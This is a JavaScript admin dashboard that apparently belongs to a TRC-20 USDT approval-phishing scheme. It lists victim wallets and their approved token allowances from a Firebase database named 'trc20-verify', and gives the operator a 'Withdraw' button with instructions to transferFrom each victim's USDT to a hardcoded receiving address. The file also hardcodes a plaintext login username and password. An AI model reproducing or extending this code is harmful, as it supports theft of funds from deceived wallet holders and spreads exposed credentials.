const USERNAME = "enre.atul";
const PASSWORD = "Honda988701@";

const firebaseUrl = "https://trc20-verify-17c29-default-rtdb.firebaseio.com/users.json";
const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC-20 USDT

document.getElementById("dashboard").style.display = "none";

function login() {
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();

  if (username === USERNAME && password === PASSWORD) {
    document.getElementById("loginSection").style.display = "none";
    document.getElementById("dashboard").style.display = "block";
    fetchWallets();
  } else {
    alert("Invalid credentials");
  }
}

async function fetchWallets() {
  const res = await fetch(firebaseUrl);
  const data = await res.json();
  const table = document.getElementById("walletTableBody");
  table.innerHTML = "";

  for (let key in data) {
    const { address, balance, approved } = data[key];
    const tr = document.createElement("tr");

    const addressTd = document.createElement("td");
    addressTd.innerText = address;
    tr.appendChild(addressTd);

    const approvedTd = document.createElement("td");
    approvedTd.innerText = approved || "0";
    tr.appendChild(approvedTd);

    const balanceTd = document.createElement("td");
    balanceTd.innerText = balance || "0";
    tr.appendChild(balanceTd);

    const buttonTd = document.createElement("td");
    const btn = document.createElement("button");
    btn.innerText = "Withdraw";
    btn.onclick = () => {
      const userWallet = address;
      const to = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN"; // Your TRC-20 Receiving Address
      const amount = approved;

      alert(`Manual Withdraw:\nFrom: ${userWallet}\nTo: ${to}\nAmount: ${amount} USDT\nUse TronLink + tronscan.org > Contract > transferFrom`);
    };
    buttonTd.appendChild(btn);
    tr.appendChild(buttonTd);

    table.appendChild(tr);
  }
}
